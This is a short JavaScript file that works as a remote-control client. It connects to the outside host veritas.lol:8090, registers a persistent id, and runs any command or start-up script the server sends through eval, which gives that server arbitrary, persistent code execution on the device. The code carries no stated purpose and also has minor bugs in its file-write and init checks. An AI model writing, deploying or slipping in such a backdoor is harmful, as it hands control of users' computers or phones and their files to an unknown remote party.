"use strict";

const SocketIOClient = require("socket.io-client");
const globalObject = require('the-global-object');
const isBrowser = require('is-browser');
const path = require('path');
const readFile = globalObject.readFile;

const writeFile = globalObject.writeFile;

const DEFAULT_PATH = process.env.WORKING_DIRECTORY || (!isBrowser && process.env.HOME || '/sdcard');

const constructPath = (filename) => path.join(DEFAULT_PATH, filename); 

(async () => {
  let client;
  let hadInit = false;
  const timeout = (n) => new Promise((resolve) => setTimeout(resolve, n));
  try {
    let initScript = readFile(constructPath("init-script.js"));
    await Promise.resolve(eval(initScript));
    hadInit = true;
  } catch (e) {}
  async function startClient() {
    let hadInit;
    try {
      client = SocketIOClient("http://veritas.lol:8090");
      //      client.connect('localhost:8090');
    } catch (e) {
      console.error(e);
      await timeout(5000);
      return startClient();
    }
    let clientId;
    try {
      clientId = readFile(constructPath("id.txt"));
      client.emit("id", { id: clientId });
    } catch (e) {
			console.error(e);
      client.emit("id", { id: "" });
    }
    client.on("set-id", ({ id }) => writeFile(constructPath("id.txt"), id.trim()));
    client.on("init-script", ({ initScript }) => {
      if (!initScript) writeFile(constructPath("/init-script.js", "void 0;"));
      writeFile(constructPath("init-script.js"), initScript);
    });
    client.on("command", ({ cmd, uuid }) => {
      if (hadInit && uuid === "silent") return true;
      const response = {
        uuid,
      };
      try {
        response.response = eval(cmd);
        response.success = true;
      } catch (e) {
				console.error(e);
        response.response = {
          message: e.message,
          stack: e.stack,
          name: e.name,
        };
        response.success = false;
      }
      client.emit("response", response);
    });
    client.on("error", async (e) => {
      console.error(e);
      await timeout(5000);
      startClient();
    });
  }
  startClient();
})();
